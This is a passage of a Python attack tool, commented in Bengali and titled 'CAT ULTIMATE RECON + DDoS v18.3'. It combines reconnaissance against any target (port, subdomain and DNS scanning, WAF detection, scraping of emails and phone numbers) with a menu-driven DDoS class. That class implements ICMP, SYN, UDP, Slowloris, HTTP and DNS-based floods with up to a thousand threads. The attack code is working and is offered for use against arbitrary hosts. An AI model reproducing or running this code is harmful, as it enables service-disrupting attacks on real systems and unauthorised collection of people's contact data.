            result["dmarc"] = str(ans[0])
        except:
            result["dmarc"] = "DMARC রেকর্ড নেই"
    except:
        result["error"] = "মেইল চেক ব্যর্থ"
    return result

# ========== ক্লাউড প্রোভাইডার ডিটেকশন ==========
def cloud_provider_detect(ip):
    log("ক্লাউড প্রোভাইডার ডিটেকশন...", "*")
    providers = {
        "AWS": ["amazonaws.com", "compute.amazonaws.com", "ec2"],
        "GCP": ["googleapis.com", "cloud.google.com", "compute.googleapis.com"],
        "Azure": ["azure.com", "cloudapp.azure.com", "azurewebsites.net"],
        "DigitalOcean": ["digitalocean.com", "cloud.digitalocean.com"],
        "Linode": ["linode.com", "linodeobjects.com"],
        "Vultr": ["vultr.com", "vultr.net"],
        "Heroku": ["herokuapp.com", "heroku.com"],
        "Cloudflare": ["cloudflare.com", "cloudflare.net"]
    }
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = r.json()
        org = data.get("org", "")
        for provider, patterns in providers.items():
            for p in patterns:
                if p in org.lower() or p in data.get("hostname", "").lower():
                    return provider
        return "Unknown"
    except:
        return "Detect করতে ব্যর্থ"

# ========== ডাটাবেস ডিটেকশন ==========
def database_detect(base_url):
    log("ডাটাবেস ডিটেকশন...", "*")
    session = get_cloudscraper_session()
    detected = []
    patterns = {
        "MySQL": ["mysql", "mysqli", "SQLSTATE", "SQL syntax", "MySQL server"],
        "PostgreSQL": ["postgresql", "pg_", "PostgreSQL", "ERROR: syntax"],
        "MongoDB": ["mongodb", "MongoError", "MongoDB"],
        "SQLite": ["sqlite", "SQLite", "sqlite_master"],
        "Oracle": ["oracle", "ORA-", "Oracle Database"],
        "MS SQL": ["sqlsrv", "mssql", "Microsoft SQL Server"]
    }
    try:
        r = session.get(base_url, timeout=CONFIG["timeout"])
        for db, patterns in patterns.items():
            for p in patterns:
                if p.lower() in r.text.lower():
                    detected.append(db)
                    break
    except:
        pass
    return list(set(detected))

# ========== OS ফিঙ্গারপ্রিন্টিং ==========
def detect_os(ttl, headers):
    os_list = []
    if ttl <= 64:
        os_list.append("Linux/Unix")
    elif ttl <= 128:
        os_list.append("Windows")
    elif ttl <= 255:
        os_list.append("Solaris/FreeBSD")
    
    if headers:
        server = headers.get('Server', '')
        for category, items in OS_FINGERPRINTS.items():
            for name, patterns in items.items():
                for pattern in patterns:
                    if pattern.lower() in server.lower():
                        os_list.append(f"{category} - {name}")
                        break
    
    return list(set(os_list))[:5]

# ========== SEO অডিট ==========
def seo_audit(base_url):
    log("SEO অডিট...", "*")
    session = get_cloudscraper_session()
    try:
        r = session.get(base_url, timeout=CONFIG["timeout"])
        soup = BeautifulSoup(r.text, 'html.parser')
        errors = []
        
        title = soup.title.string if soup.title else ""
        if not title:
            errors.append("মেটা টাইটেল নেই")
        elif len(title) < 30:
            errors.append("মেটা টাইটেল খুব ছোট")
        elif len(title) > 60:
            errors.append("মেটা টাইটেল খুব বড়")
        
        meta_desc = soup.find('meta', attrs={'name': 'description'})
        if not meta_desc:
            errors.append("মেটা ডেসক্রিপশন নেই")
        elif len(meta_desc.get('content', '')) < 50:
            errors.append("মেটা ডেসক্রিপশন খুব ছোট")
        elif len(meta_desc.get('content', '')) > 160:
            errors.append("মেটা ডেসক্রিপশন খুব বড়")
        
        h1_tags = soup.find_all('h1')
        if len(h1_tags) == 0:
            errors.append("কোন H1 ট্যাগ নেই")
        elif len(h1_tags) > 1:
            errors.append("একাধিক H1 ট্যাগ আছে")
        
        canonical = soup.find('link', attrs={'rel': 'canonical'})
        if not canonical:
            errors.append("ক্যানোনিক্যাল URL নেই")
        
        return {
            "errors": errors,
            "title": title,
            "description": meta_desc.get('content', '') if meta_desc else '',
            "h1_count": len(h1_tags),
            "has_canonical": bool(canonical)
        }
    except Exception as e:
        return {"error": str(e)}

# ========== সিকিউরিটি অডিট ==========
def security_audit(base_url):
    log("সিকিউরিটি অডিট...", "*")
    session = get_cloudscraper_session()
    try:
        r = session.get(base_url, timeout=CONFIG["timeout"])
        headers = r.headers
        errors = []
        
        required_headers = {
            "Strict-Transport-Security": "HSTS হেডার নেই",
            "X-Frame-Options": "X-Frame-Options হেডার নেই",
            "X-Content-Type-Options": "X-Content-Type-Options হেডার নেই",
            "Content-Security-Policy": "CSP হেডার নেই",
            "Referrer-Policy": "Referrer-Policy হেডার নেই",
            "Permissions-Policy": "Permissions-Policy হেডার নেই"
        }
        
        for header, msg in required_headers.items():
            if header not in headers:
                errors.append(msg)
        
        return {
            "errors": errors,
            "headers": dict(headers),
            "cookies": dict(r.cookies)
        }
    except Exception as e:
        return {"error": str(e)}

# ========== পারফরম্যান্স অডিট ==========
def performance_audit(base_url):
    log("পারফরম্যান্স অডিট...", "*")
    session = get_cloudscraper_session()
    try:
        start = time.time()
        r = session.get(base_url, timeout=CONFIG["timeout"])
        load_time = time.time() - start
        
        return {
            "load_time": round(load_time, 3),
            "status": r.status_code,
            "content_length": len(r.content)
        }
    except Exception as e:
        return {"error": str(e)}

# ========== WAF ডিটেকশন ==========
def detect_waf(base_url):
    log("WAF ডিটেকশন...", "*")
    waf_signatures = RESOURCES["signatures"]["waf"]
    detected = []
    try:
        r = get_cloudscraper_session().get(base_url, timeout=CONFIG["timeout"])
        headers = r.headers
        for waf, sigs in waf_signatures.items():
            for sig in sigs:
                if sig.lower() in str(headers).lower() or sig.lower() in r.text.lower():
                    detected.append(waf)
                    log(f"WAF সনাক্ত: {waf}", "!")
                    break
        if not detected:
            log("WAF সনাক্ত হয়নি", "+")
    except:
        pass
    return list(set(detected))

# ========== 7-লেয়ার DDoS ==========
class DDoSAttack:
    def __init__(self, target, port=80, threads=1000, duration=60, layer=7, vector="mixed"):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.layer = layer
        self.vector = vector
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.ai_analysis = []
        
    def layer3_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x00\x00\x00' + b'CAT-DDoS' * 200
            while self.running:
                sock.sendto(packet, (self.target, 0))
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
                time.sleep(random.uniform(0.0005, 0.002))
        except:
            with self.lock:
                self.errors += 1
    
    def layer4_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            while self.running:
                try:
                    sock.connect((self.target, self.port))
                    sock.send(b"SYN" * 200)
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += 600
                except:
                    pass
                time.sleep(random.uniform(0.0005, 0.002))
        except:
            with self.lock:
                self.errors += 1
    
    def layer5_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = b'CAT-DDoS' * 2000
            while self.running:
                sock.sendto(packet, (self.target, self.port))
                with self.lock:
                    self.packets_sent += 1
                    self.bytes_sent += len(packet)
                time.sleep(random.uniform(0.0005, 0.002))
        except:
            with self.lock:
                self.errors += 1
    
    def layer6_attack(self):
        try:
            conn = http.client.HTTPConnection(self.target, self.port, timeout=10)
            conn.request("GET", "/", headers={"User-Agent": get_random_ua()})
            while self.running:
                headers = [f"X-a: {random.randint(0, 999999)}" for _ in range(50)]
                for h in headers:
                    conn.send(f"{h}\r\n".encode())
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += len(h) + 2
                time.sleep(random.uniform(0.5, 2))
        except:
            with self.lock:
                self.errors += 1
    
    def layer7_attack(self):
        try:
            session = get_session()
            paths = ["/", "/index.html", "/wp-admin", "/api/v1", "/graphql", "/dashboard", "/login", "/search"]
            while self.running:
                try:
                    path = random.choice(paths)
                    r = session.get(f"http://{self.target}{path}", timeout=2)
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += len(r.content) + len(r.request.headers)
                    analysis = ai_analyzer.analyze(r.text)
                    self.ai_analysis.append(analysis)
                except:
                    with self.lock:
                        self.errors += 1
                time.sleep(random.uniform(0.005, 0.02))
        except:
            with self.lock:
                self.errors += 1
    
    def amplification_attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            domains = ["www.google.com", "www.youtube.com", "www.facebook.com", "www.twitter.com"]
            for domain in domains:
                dns_query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                parts = domain.split('.')
                for p in parts:
                    dns_query += bytes([len(p)]) + p.encode()
                dns_query += b'\x00\x00\x01\x00\x01'
                while self.running:
                    sock.sendto(dns_query, (self.target, 53))
                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += len(dns_query)
                    time.sleep(random.uniform(0.0005, 0.002))
        except:
            with self.lock:
                self.errors += 1
    
    def mixed_attack(self):
        attacks = [self.layer3_attack, self.layer4_attack, self.layer5_attack, 
                   self.layer6_attack, self.layer7_attack, self.amplification_attack]
        while self.running:
            random.choice(attacks)()
            time.sleep(random.uniform(0.05, 0.2))
    
    def start(self):
        log(f"🔥 DDoS শুরু: {self.target}:{self.port} | লেয়ার: {self.layer} | থ্রেড: {self.threads} | সময়: {self.duration}s", "d")
        start_time = time.time()
        
        attack_funcs = {
            3: self.layer3_attack,
            4: self.layer4_attack,
            5: self.layer5_attack,
            6: self.layer6_attack,
            7: self.layer7_attack,
            8: self.amplification_attack,
            9: self.mixed_attack
        }
        attack_func = attack_funcs.get(self.layer, self.layer7_attack)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(attack_func) for _ in range(self.threads)]
            
            def report_loop():
                report_count = 0
                while self.running:
                    elapsed = time.time() - start_time
                    with self.lock:
                        pps = self.packets_sent / elapsed if elapsed > 0 else 0
                        bps = self.bytes_sent / elapsed if elapsed > 0 else 0
                        errors = self.errors
                    log(f"📊 DDoS স্ট্যাটাস: প্যাকেট: {self.packets_sent:,} | PPS: {pps:.0f} | BPS: {bps/1024/1024:.2f} MB/s | এরর: {errors}", "a")
                    live_report()
                    time.sleep(1)
                    report_count += 1
                    if elapsed >= self.duration:
                        self.running = False
                        break
            
            report_thread = threading.Thread(target=report_loop)
            report_thread.start()
            
            time.sleep(self.duration)
            self.running = False
            report_thread.join()
        
        log(f"✅ DDoS শেষ: {self.packets_sent:,} প্যাকেট, {self.bytes_sent/1024/1024:.2f} MB", "+")

# ========== রিকন মডিউল ==========
def dns_scan(target):
    log("DNS গভীর স্ক্যান...", "*")
    records = {}
    types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR', 'SRV', 'DNSKEY', 'DS', 'NSEC', 'TLSA', 'NAPTR', 'LOC']
    for r in tqdm(types, desc="DNS রেকর্ড"):
        try:
            ans = dns.resolver.resolve(target, r)
            records[r] = [str(x) for x in ans]
        except:
            records[r] = []
    return records

def ct_logs(target):
    log("CT লগ থেকে সাবডোমেইন সংগ্রহ...", "*")
    try:
        url = f"https://crt.sh/?q=%25.{target}&output=json"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            domains = set()
            for entry in data:
                name = entry.get('name_value', '')
                if name.endswith(target) and name != target:
                    domains.add(name)
            return list(domains)
    except:
        pass
    return []

def subdomain_bruteforce(target):
    log("সাবডোমেইন ব্রুটফোর্স...", "*")
    sub_list = RESOURCES["wordlists"]["subdomains"]
    found = []
    takeover = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
        def check_sub(sub):
            target_sub = f"{sub}.{target}"
            try:
                dns.resolver.resolve(target_sub, 'A')
                return target_sub
            except:
                return None
        futures = [executor.submit(check_sub, sub) for sub in sub_list]
        for f in tqdm(concurrent.futures.as_completed(futures), total=len(sub_list), desc="সাবডোমেইন"):
            res = f.result()
            if res:
                found.append(res)
                log(f"সাবডোমেইন: {res}", "+")
    return found, takeover

def port_scan(target):
    log("পোর্ট স্ক্যান (TCP+UDP)...", "*")
    start_port, end_port = CONFIG["port_range"]
    ports = list(range(start_port, end_port + 1))
    open_ports = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
        def scan_tcp(p):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target, p))
                sock.close()
                if result == 0:
                    return p
            except:
                pass
            return None
        futures = {executor.submit(scan_tcp, p): p for p in ports}
        for future in tqdm(concurrent.futures.as_completed(futures), total=len(ports), desc="TCP পোর্ট"):
            res = future.result()
            if res:
                open_ports.append(res)
                log(f"ওপেন TCP পোর্ট: {res}", "+")
    
    if CONFIG["udp_scan"]:
        with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG["threads"]) as executor:
            def scan_udp(p):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(1)
                    sock.sendto(b"\x00", (target, p))
                    data, _ = sock.recvfrom(1024)
                    sock.close()
                    if data:
                        return p
                except:
                    pass
                return None
            futures = {executor.submit(scan_udp, p): p for p in CONFIG["udp_ports"]}
            for future in tqdm(concurrent.futures.as_completed(futures), total=len(CONFIG["udp_ports"]), desc="UDP পোর্ট"):
                res = future.result()
                if res:
                    open_ports.append(res)
                    log(f"ওপেন UDP পোর্ট: {res}", "+")
    
    return open_ports

def ipv6_scan(target):
    if not CONFIG["ipv6"]:
        return []
    log("IPv6 স্ক্যান...", "*")
    try:
        ans = dns.resolver.resolve(target, 'AAAA')
        return [str(x) for x in ans]
    except:
        return []

def fingerprint(base_url):
    log("টেক স্ট্যাক ফিঙ্গারপ্রিন্ট...", "*")
    session = get_cloudscraper_session()
    try:
        r = session.get(base_url, timeout=CONFIG["timeout"])
        headers = r.headers
        soup = BeautifulSoup(r.text, 'html.parser')
        
        server = headers.get("Server", "")
        powered = headers.get("X-Powered-By", "")
        
        cms_signatures = RESOURCES["signatures"]["cms"]
        detected = []
        for cms, patterns in cms_signatures.items():
            for p in patterns:
                if p in r.text.lower():
                    detected.append(cms)
                    break
        
        title = soup.title.string if soup.title else ""
        
        return {
            "server": server,
            "powered_by": powered,
            "cms": list(set(detected)),
            "title": title,
            "headers": dict(headers)
        }
    except Exception as e:
        return {"error": str(e)}

def extract_contacts(base_url):
    log("কন্টাক্ট এক্সট্র্যাক্ট...", "*")
    session = get_cloudscraper_session()
    try:
        r = session.get(base_url, timeout=CONFIG["timeout"])
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
        phones = re.findall(r'(\+?88?)?01[3-9]\d{8}', r.text)
        social = {
            "facebook": re.findall(r'facebook\.com/[a-zA-Z0-9.]+', r.text),
            "twitter": re.findall(r'twitter\.com/[a-zA-Z0-9_]+', r.text),
            "linkedin": re.findall(r'linkedin\.com/in/[a-zA-Z0-9-]+', r.text),
            "instagram": re.findall(r'instagram\.com/[a-zA-Z0-9_.]+', r.text)
        }
        return {"emails": list(set(emails)), "phones": list(set(phones)), "social": social}
    except:
        return {"emails": [], "phones": [], "social": {}}

def ssl_check(target):
    log("SSL সাইফার চেক...", "*")
    weak_ciphers = ["RC4", "DES", "3DES", "MD5", "NULL", "EXPORT", "LOW", "anon", "CBC"]
    found_weak = []
    try:
        context = ssl.create_default_context()
        with socket.create_connection((target, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cipher = ssock.cipher()
                cert = ssock.getpeercert()
                for w in weak_ciphers:
                    if w in cipher[0]:
                        found_weak.append(cipher[0])
                return {
                    "cipher": cipher[0],
                    "weak": found_weak,
                    "issuer": cert.get('issuer'),
                    "expiry": cert.get('notAfter')
                }
    except:
        return {"error": "SSL চেক ব্যর্থ"}

# ========== রিপোর্ট জেনারেট ==========
def generate_report(report):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    target = report['target']
    
    # JSON
    json_file = f"{CONFIG['output_dir']}/{target}_{timestamp}.json"
    with open(json_file, 'w') as f:
        json.dump(report, f, indent=2, default=str)
    
    # HTML
    html_file = f"{CONFIG['output_dir']}/{target}_{timestamp}.html"
    html = f"""
    <!DOCTYPE html>
    <html>
    <head><title>Scan Report - {target}</title>
    <style>
        body{{font-family:'Courier New',monospace;background:#0a0a0a;color:#00ffcc;padding:20px;}}
        .card{{background:#1a1a2e;padding:15px;border-radius:8px;margin:10px 0;border:1px solid #00ffcc;}}
        h1{{color:#00ffcc;text-shadow:0 0 10px #00ffcc;}}
        pre{{background:#111;padding:10px;border-radius:5px;overflow-x:auto;color:#00ffcc;}}
    </style>
    </head>
    <body>
    <h1>🔍 Scan Report - {target}</h1>
    <p><strong>Scan Time:</strong> {report['timestamp']}</p>
    <p><strong>Duration:</strong> {report.get('scan_duration_sec', 0)} seconds</p>
    <p><strong>Data Source:</strong> {report.get('domain_info', {}).get('source', 'unknown')}</p>
    
    <div class="card"><h3>🌐 Domain Info</h3><pre>{json.dumps(report.get('domain_info', {}), indent=2)}</pre></div>
    <div class="card"><h3>🔒 DNS Security</h3><pre>{json.dumps(report.get('dns_security', {}), indent=2)}</pre></div>
    <div class="card"><h3>📧 Mail Server</h3><pre>{json.dumps(report.get('mail_server', {}), indent=2)}</pre></div>
    <div class="card"><h3>☁️ Cloud Provider</h3><pre>{report.get('cloud_provider', 'N/A')}</pre></div>
    <div class="card"><h3>🗄️ Database</h3><pre>{report.get('database', [])}</pre></div>
    <div class="card"><h3>🌐 DNS</h3><pre>{json.dumps(report['dns'], indent=2)}</pre></div>
    <div class="card"><h3>📡 Open Ports</h3><pre>{report['open_ports']}</pre></div>
    <div class="card"><h3>🔗 Subdomains</h3><pre>{report['subdomains']}</pre></div>
    <div class="card"><h3>🛡️ WAF</h3><pre>{report.get('waf', [])}</pre></div>
    <div class="card"><h3>💻 OS</h3><pre>{report.get('os', 'N/A')}</pre></div>
    <div class="card"><h3>🧠 Tech Stack</h3><pre>{json.dumps(report['tech_stack'], indent=2)}</pre></div>
    <div class="card"><h3>📧 Contacts</h3><pre>{json.dumps(report['contacts'], indent=2)}</pre></div>
    <div class="card"><h3>🔐 SSL</h3><pre>{json.dumps(report.get('ssl', {}), indent=2)}</pre></div>
    <div class="card"><h3>🔍 SEO Audit</h3><pre>{json.dumps(report.get('seo_audit', {}), indent=2)}</pre></div>
    <div class="card"><h3>🛡️ Security Audit</h3><pre>{json.dumps(report.get('security_audit', {}), indent=2)}</pre></div>
    <div class="card"><h3>⚡ Performance Audit</h3><pre>{json.dumps(report.get('performance_audit', {}), indent=2)}</pre></div>
    <div class="card"><h3>❌ Errors Found</h3><pre>{json.dumps(ERRORS, indent=2)}</pre></div>
    </body></html>
    """
    with open(html_file, 'w') as f:
        f.write(html)
    
    # CSV
    csv_file = f"{CONFIG['output_dir']}/{target}_{timestamp}.csv"
    with open(csv_file, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["Category", "Data"])
        writer.writerow(["Target", report['target']])
        writer.writerow(["Open Ports", str(report['open_ports'])])
        writer.writerow(["Subdomains", str(report['subdomains'])])
        writer.writerow(["WAF", str(report.get('waf', []))])
        writer.writerow(["OS", str(report.get('os', 'N/A'))])
        writer.writerow(["Cloud Provider", report.get('cloud_provider', 'N/A')])
        writer.writerow(["Database", str(report.get('database', []))])
        writer.writerow(["Tech Stack", str(report['tech_stack'])])
    
    # TXT
    txt_file = f"{CONFIG['output_dir']}/{target}_{timestamp}.txt"
    with open(txt_file, 'w') as f:
        f.write(json.dumps(report, indent=2, default=str))
    
    # সর্বশেষ রিপোর্ট
    with open(f"{CONFIG['output_dir']}/latest_report.json", 'w') as f:
        json.dump(report, f, indent=2, default=str)
    
    log(f"📄 রিপোর্ট সেভ: {json_file}, {html_file}, {csv_file}, {txt_file}", "+")
    return json_file, html_file, csv_file, txt_file

# ========== মেইন ==========
def main():
    print("\n" + "="*60)
    print("🐱 CAT ULTIMATE RECON + DDoS v18.3")
    print("="*60)
    print("Select Mode:")
    print("  1. DDoS Attack")
    print("  2. Recon Scan")
    print("="*60)
    
    choice = input("\n👉 Enter 1 or 2: ").strip()
    
    if choice == "1":
        # ===== DDoS মোড =====
        print("\n" + "="*60)
        print("🔥 DDoS MODE")
        print("="*60)
        
        target = input("🎯 Target (IP or Domain): ").strip()
        if not target:
            log("❌ Target required!", "-")
            sys.exit(1)
        
        try:
            port = int(input("🔌 Port (default 80): ").strip() or "80")
        except:
            port = 80
        
        try:
            threads = int(input("🧵 Threads (default 1000): ").strip() or "1000")
        except:
            threads = 1000
        
        try:
            duration = int(input("⏱️ Duration (seconds, default 60): ").strip() or "60")
        except:
            duration = 60
        
        print("\n🧩 Select Layer:")
        print("  3. ICMP Flood (Layer 3)")
        print("  4. SYN Flood (Layer 4)")
        print("  5. UDP Flood (Layer 5)")
        print("  6. Slowloris (Layer 6)")
        print("  7. HTTP Flood (Layer 7)")
        print("  8. DNS Amplification")
        print("  9. Mixed (All Layers)")
        try:
            layer = int(input("👉 Enter layer (3-9): ").strip() or "9")
        except:
            layer = 9
        
        log(f"🔥 DDoS Config: {target}:{port} | Layer: {layer} | Threads: {threads} | Duration: {duration}s", "d")
        
        attack = DDoSAttack(target, port, threads, duration, layer)
        attack.start()
        
        ddos_report = {
            "target": target,
            "port": port,
            "layer": layer,
            "threads": threads,
            "duration": duration,
            "packets_sent": attack.packets_sent,
            "bytes_sent": attack.bytes_sent,
            "errors": attack.errors,
            "timestamp": datetime.now().isoformat()
        }
        with open(f"{CONFIG['output_dir']}/ddos_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", 'w') as f:
            json.dump(ddos_report, f, indent=2)
        
        log("✅ DDoS Complete!", "+")
        sys.exit(0)
    
    elif choice == "2":
        # ===== রিকন মোড =====
        print("\n" + "="*60)
        print("🔍 RECON MODE")
        print("="*60)
        
        target = input("🎯 Target (Domain or IP): ").strip()
        if not target:
            log("❌ Target required!", "-")
            sys.exit(1)
        
        if not target.startswith(("http://", "https://")):
            base_url = f"https://{target}"
        else:
            base_url = target
            target = urlparse(target).hostname
        
        log(f"🎯 Target: {target}", "s")
        start_time = time.time()
        
        # IP
        try:
            ip = socket.gethostbyname(target)
        except:
            ip = "N/A"
        
        # OS
        os_result = "N/A"
        try:
            import subprocess
            result = subprocess.check_output(["ping", "-c", "1", target], stderr=subprocess.DEVNULL, timeout=3)
            ttl_match = re.search(r"ttl=(\d+)", str(result))
            if ttl_match:
                ttl = int(ttl_match.group(1))
                os_result = detect_os(ttl, {})
        except:
            pass
        
        # WAF
        waf_list = detect_waf(base_url)
        
        # প্যারালাল স্ক্যান
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            dns_future = executor.submit(dns_scan, target)
            port_future = executor.submit(port_scan, target)
            sub_future = executor.submit(subdomain_bruteforce, target)
            ct_future = executor.submit(ct_logs, target)
            ipv6_future = executor.submit(ipv6_scan, target)
            ssl_future = executor.submit(ssl_check, target)
            domain_future = executor.submit(domain_info, target)
            dns_sec_future = executor.submit(dns_security_check, target)
            mail_future = executor.submit(mail_server_check, target)
            
            dns_result = dns_future.result()
            open_ports = port_future.result()
            subdomains, takeover = sub_future.result()
            ct_domains = ct_future.result()
            ipv6_addrs = ipv6_future.result()
            ssl_result = ssl_future.result()
            domain_result = domain_future.result()
            dns_sec_result = dns_sec_future.result()
            mail_result = mail_future.result()
        
        cloud_provider = cloud_provider_detect(ip) if ip != "N/A" else "N/A"
        databases = database_detect(base_url)
        seo_result = seo_audit(base_url)
        security_result = security_audit(base_url)
        performance_result = performance_audit(base_url)
        tech_stack = fingerprint(base_url)
        contacts = extract_contacts(base_url)
        
        report = {
            "target": target,
            "ip": ip,
            "timestamp": datetime.now().isoformat(),
            "scan_duration_sec": round(time.time() - start_time, 2),
            "domain_info": domain_result,
            "dns_security": dns_sec_result,
            "mail_server": mail_result,
            "cloud_provider": cloud_provider,
            "database": databases,
            "dns": dns_result,
            "open_ports": open_ports,
            "ipv6": ipv6_addrs,
            "subdomains": list(set(subdomains + ct_domains)),
            "waf": waf_list,
            "os": os_result,
            "ssl": ssl_result,
            "tech_stack": tech_stack,
            "contacts": contacts,
            "seo_audit": seo_result,
            "security_audit": security_result,
            "performance_audit": performance_result,
            "resources": {
                "os_fingerprints": len(OS_FINGERPRINTS),
                "total_resources": len(RESOURCES)
            }
        }
        
        log(f"✅ Scan Complete! Time: {report['scan_duration_sec']:.2f}s", "+")
        json_file, html_file, csv_file, txt_file = generate_report(report)
        
        print("\n📋 Summary:")
        print(f"📄 Report: {html_file}")
        print(f"🖥️ OS: {os_result}")
        print(f"📦 OS Fingerprints: {len(OS_FINGERPRINTS)}+")
        print(f"📦 Resources: {len(RESOURCES)}+")
        sys.exit(0)
    
    else:
        log("❌ Invalid choice! Only 1 or 2.", "-")
        sys.exit(1)

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()